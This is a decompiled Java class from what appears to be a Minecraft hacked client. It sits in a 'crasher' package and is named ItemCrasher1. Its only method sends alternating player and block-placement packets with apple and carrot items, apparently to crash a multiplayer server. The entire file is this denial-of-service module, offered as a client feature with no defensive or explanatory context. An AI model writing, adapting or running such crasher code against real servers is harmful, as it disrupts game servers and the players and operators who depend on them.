// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.ims;

import net.minecraft.network.play.client.CPacketPlayerBlockPlacement;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.client.Minecraft;

public class ItemCrasher1
{
    public static void start() {
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayer(true));
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayerBlockPlacement(new ItemStack(Items.APPLE)));
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayer(true));
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayerBlockPlacement(new ItemStack(Items.CARROT)));
    }
}
